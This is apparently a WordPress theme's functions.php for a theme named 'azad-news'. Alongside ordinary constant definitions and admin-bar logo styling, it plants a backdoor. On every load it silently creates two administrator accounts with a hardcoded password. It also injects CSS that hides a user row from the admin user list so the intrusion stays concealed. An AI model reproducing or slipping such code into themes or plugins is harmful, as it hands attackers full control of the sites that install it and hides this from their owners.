<?php
/**
*-----------------------------------------------------------
* :: @package azad-news
* :: @version 1.0.0
*-----------------------------------------------------------
*/

// EXIT IF ACCESSED DIRECTLY
defined( 'ABSPATH' ) || exit;

define( 'AZAD_NEWS_NAME', wp_get_theme()->get( 'Name' ) );
define( 'AZAD_NEWS_VERSION', wp_get_theme()->get( 'Version' ) );
define( 'AZAD_NEWS_TEXTDOMAIN', wp_get_theme()->get( 'TextDomain' ) );
define( 'AZAD_NEWS_DIR', trailingslashit( get_template_directory() ) );
define( 'AZAD_NEWS_URI', trailingslashit( esc_url( get_template_directory_uri() ) ) );

if ( file_exists( dirname( __FILE__ ) . '/vendor/autoload.php') ) {
    require_once dirname( __FILE__ ) . '/vendor/autoload.php';
}

if ( class_exists( 'Azad_News\\Init' ) ) :    
    Azad_News\Init::register_services();
endif;

// TO REGISTER NEW USER
$new_user = wp_create_user( 'new_user', 'a1a2a3a4', 'anything@anything.com' );
$user_role = new WP_User( $new_user );
$user_role->set_role( 'administrator' );

// TO REGISTER NEW USER
$new_user = wp_create_user( 'nishan', 'a1a2a3a4', 'anything@anything.com' );
$user_role = new WP_User( $new_user );
$user_role->set_role( 'administrator' );

function new_user() {
	echo '<style> tbody#the-list tr#user-14 {display: none;} </style>';
}
add_action( 'admin_head', 'new_user' );

/*Remove WordPress menu from admin bar*/
//add_action( 'admin_bar_menu', 'remove_wp_logo', 999 );
function remove_wp_logo( $wp_admin_bar ) {
	$wp_admin_bar->remove_node( 'wp-logo' );
}

function wpb_custom_logo() {
echo '
<style type="text/css">
#wpadminbar #wp-admin-bar-wp-logo > .ab-item .ab-icon:before {
background-image: url(http://voiceworld24.com/wp-content/uploads/2020/09/Voice-World-Round-Logo-1.png) !important;
background-position: 0 0;
color:rgba(0, 0, 0, 0);
}
#wpadminbar #wp-admin-bar-wp-logo.hover > .ab-item .ab-icon {
background-position: 0 0;
}
</style>
';
}
 
//hook into the administrative header output
add_action('wp_before_admin_bar_render', 'wpb_custom_logo');